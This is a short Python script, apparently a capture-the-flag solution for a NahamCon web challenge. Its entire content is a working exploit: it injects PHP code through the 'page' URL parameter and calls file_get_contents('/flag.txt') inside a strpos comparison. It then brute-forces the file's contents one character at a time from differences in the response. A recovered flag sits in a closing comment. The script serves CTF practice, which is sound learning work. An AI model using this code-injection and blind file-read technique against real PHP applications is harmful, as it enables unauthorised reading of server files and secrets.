#!/usr/bin/env python3

import requests
import string

session = requests.Session()

url = 'http://challenge.nahamcon.com:32184/index.php?page='

flag = 'flag{'

while '}' not in flag:
	for c in string.hexdigits.lower() + '}':
		payload = f"','qw')%3d%3d%3dfalse+%26%26+strpos(file_get_contents('/flag.txt'),'{flag+c}')!%3d%3dfalse+%26%26+strpos('abc"
		endpoint = url + payload
		r = session.get(endpoint)

		if 'HACKING' not in r.text:
			flag += c
			print(flag)

# flag{85a25711fa6e111ed54b86468a45b90c}